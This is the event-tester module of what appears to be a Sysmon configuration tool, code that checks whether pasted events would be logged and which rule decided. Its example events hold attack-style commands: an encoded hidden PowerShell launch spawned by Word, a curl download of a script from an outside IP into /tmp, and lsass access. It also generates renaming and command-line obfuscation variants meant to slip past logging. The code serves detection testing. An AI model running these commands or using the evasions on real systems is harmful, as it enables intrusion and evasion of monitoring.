// Event tester: paste real events, see whether the config logs them and which rule decided,
// edit fields to ask "what if", and try common evasion variants.

import { EVENT_BY_TAG } from '../schema.js';
import { parseEvents, evaluate, describeItem, tagForEventId } from '../matcher.js';

const local = { text: '', events: [] };

const EXAMPLES = {
  windows: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID></System><EventData>
  <Data Name="RuleName">-</Data><Data Name="UtcTime">2026-10-31 09:12:44.101</Data>
  <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
  <Data Name="OriginalFileName">PowerShell.EXE</Data>
  <Data Name="CommandLine">powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA</Data>
  <Data Name="CurrentDirectory">C:\\Users\\alice\\Documents\\</Data><Data Name="User">CORP\\alice</Data>
  <Data Name="IntegrityLevel">Medium</Data>
  <Data Name="ParentImage">C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE</Data>
  <Data Name="ParentCommandLine">"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n invoice.docm</Data>
</EventData></Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>3</EventID></System><EventData>
  <Data Name="RuleName">-</Data><Data Name="Image">C:\\Windows\\System32\\certutil.exe</Data><Data Name="User">CORP\\alice</Data>
  <Data Name="Protocol">tcp</Data><Data Name="Initiated">true</Data><Data Name="SourceIp">10.0.4.21</Data>
  <Data Name="DestinationIp">203.0.113.50</Data><Data Name="DestinationHostname">files.example.net</Data><Data Name="DestinationPort">443</Data>
</EventData></Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>10</EventID></System><EventData>
  <Data Name="RuleName">-</Data><Data Name="SourceImage">C:\\Users\\alice\\AppData\\Local\\Temp\\upd.exe</Data>
  <Data Name="TargetImage">C:\\Windows\\system32\\lsass.exe</Data><Data Name="GrantedAccess">0x1010</Data>
  <Data Name="CallTrace">C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|UNKNOWN(00000000004A12B0)</Data>
</EventData></Event>`,
  linux: `<Event><System><Provider Name="Linux-Sysmon"/><EventID>1</EventID></System><EventData>
  <Data Name="RuleName">-</Data><Data Name="Image">/usr/bin/curl</Data>
  <Data Name="CommandLine">curl -s http://203.0.113.50/x.sh -o /tmp/x.sh</Data><Data Name="User">www-data</Data>
  <Data Name="ParentImage">/usr/sbin/apache2</Data><Data Name="CurrentDirectory">/var/www/html</Data>
</EventData></Event>
<Event><System><Provider Name="Linux-Sysmon"/><EventID>11</EventID></System><EventData>
  <Data Name="RuleName">-</Data><Data Name="Image">/usr/bin/bash</Data><Data Name="TargetFilename">/etc/cron.d/backup</Data><Data Name="User">root</Data>
</EventData></Event>`,
};

function verdictHtml(ctx, r) {
  const { h } = ctx;
  const badge = r.logged === true ? '<span class="verdict logged">Logged</span>'
    : r.logged === false ? '<span class="verdict dropped">Dropped</span>' : '<span class="verdict default">Sysmon default</span>';
  const link = (item, kind) => item
    ? `<p class="match ${kind}"><b>${kind === 'include' ? 'Include' : 'Exclude'} match:</b> <a href="#" data-jump="${r.tag}" data-item="${item.id}">${h(describeItem(item))}</a>${item.name ? ` <span class="pill">${h(item.name)}</span>` : ''}</p>` : '';
  return `${badge} <span class="reason">${h(r.reason)}</span>${link(r.include, 'include')}${link(r.exclude, 'exclude')}`;
}

// Variants an attacker could try against the rules that matter for this event.
function variants(ctx, ev) {
  const lin = ctx.state.cfg.platform === 'linux';
  const field = ['Image', 'SourceImage', 'ImageLoaded'].find(f => ev.fields[f]);
  if (!field) return [];
  const path = ev.fields[field];
  const sep = lin ? '/' : '\\';
  const dir = path.slice(0, path.lastIndexOf(sep) + 1);
  const name = path.slice(path.lastIndexOf(sep) + 1);
  const ext = name.includes('.') ? name.slice(name.lastIndexOf('.')) : '';
  const out = [
    { label: `Renamed binary (${field} → ${dir}svc-helper${ext})`, fields: { ...ev.fields, [field]: `${dir}svc-helper${ext}` } },
    { label: `Copied to a user-writable folder (${lin ? '/tmp/' : 'C:\\Users\\Public\\'}${name})`, fields: { ...ev.fields, [field]: `${lin ? '/tmp/' : 'C:\\Users\\Public\\'}${name}` } },
  ];
  if (ev.fields.CommandLine) {
    const cl = ev.fields.CommandLine;
    const obf = lin ? cl.replace(/ /, '  ') : cl.replace(/ -/g, ' /').replace(/(\w)(\w)/, '$1^$2');
    if (obf !== cl) out.push({ label: 'Obfuscated command line (switch / caret / spacing tricks)', fields: { ...ev.fields, CommandLine: obf } });
  }
  return out;
}

export function html(ctx) {
  const { h, state } = ctx;
  const evs = local.events;
  let body = '';
  if (evs.length) {
    body = evs.slice(0, 50).map((ev, idx) => {
      const r = evaluate(state.cfg, ev);
      const def = EVENT_BY_TAG[r.tag];
      const vars = r.logged !== null ? variants(ctx, ev).map(v => {
        const vr = evaluate(state.cfg, { ...ev, fields: v.fields });
        const flip = vr.logged !== r.logged;
        return `<li class="${flip ? (vr.logged ? 'gain' : 'evade') : ''}">${flip ? (vr.logged ? '▲ ' : '⚠ ') : ''}${h(v.label)}: <b>${vr.logged ? 'logged' : 'dropped'}</b>${flip && !vr.logged ? ' — an attacker could avoid this log this way' : ''}</li>`;
      }).join('') : '';
      const fieldNames = [...new Set([...(def?.fields || []).filter(f => f !== 'RuleName' && f !== 'UtcTime' && ev.fields[f] !== undefined), ...Object.keys(ev.fields).filter(f => f !== 'RuleName')])];
      return `<article class="card tested">
        <header><h3>Event ${ev.id} <code>${h(r.tag || 'unknown')}</code></h3><div>${verdictHtml(ctx, r)}</div></header>
        <details ${evs.length <= 3 ? 'open' : ''}><summary>Fields (edit to test "what if")</summary>
          <div class="kv">${fieldNames.map(f => `<label>${h(f)}</label><input data-tev="${idx}" data-f="${h(f)}" value="${h(ev.fields[f] ?? '')}" spellcheck="false">`).join('')}</div>
        </details>
        ${vars ? `<div class="variants"><b>Evasion check</b><ul>${vars}</ul></div>` : ''}
      </article>`;
    }).join('') + (evs.length > 50 ? `<p class="mode-help">Showing 50 of ${evs.length} events. Use Log analysis for bulk samples.</p>` : '');
  }
  return `<header><h2>Event tester</h2>
    <p class="lede">Paste one or more Sysmon events to see whether this config logs them, which rule decided, and whether simple evasions would slip past. Accepts Event Viewer XML ("Details → XML View"), <code>wevtutil</code> or <code>Get-WinEvent ... ToXml()</code> output, Sysmon for Linux syslog lines, and JSON/CSV from Splunk or Elastic.</p></header>
    <div class="toolbar">
      <button class="small" data-act="tester-example">Load example events</button>
      <button class="small" data-act="tester-clear">Clear</button>
    </div>
    <textarea id="tester-text" class="code-input" spellcheck="false" placeholder="&lt;Event&gt;...&lt;/Event&gt;">${h(local.text)}</textarea>
    <div class="toolbar"><button class="primary" data-act="tester-run">Test events</button><span class="count">${evs.length ? `${evs.length} event${evs.length > 1 ? 's' : ''} parsed` : ''}</span></div>
    <div id="tester-results">${body}</div>`;
}

export function click(act, btn, ctx) {
  if (act === 'tester-example') { local.text = EXAMPLES[ctx.state.cfg.platform] || EXAMPLES.windows; local.events = parseEvents(local.text); ctx.render(); return true; }
  if (act === 'tester-clear') { local.text = ''; local.events = []; ctx.render(); return true; }
  if (act === 'tester-run') {
    local.text = ctx.$('#tester-text').value;
    local.events = parseEvents(local.text);
    if (!local.events.length) ctx.toast('No Sysmon events found. Paste event XML, JSON or CSV with an EventID column.');
    ctx.render();
    return true;
  }
  return false;
}

export function input(t) {
  if (t.id === 'tester-text') { local.text = t.value; return true; }
  return !!t.dataset.tev;
}

export function change(t, ctx) {
  if (!t.dataset.tev) return false;
  const ev = local.events[+t.dataset.tev];
  ev.fields[t.dataset.f] = t.value;
  ev.tag = ev.tag || tagForEventId(ev.id);
  ctx.render();
  return true;
}
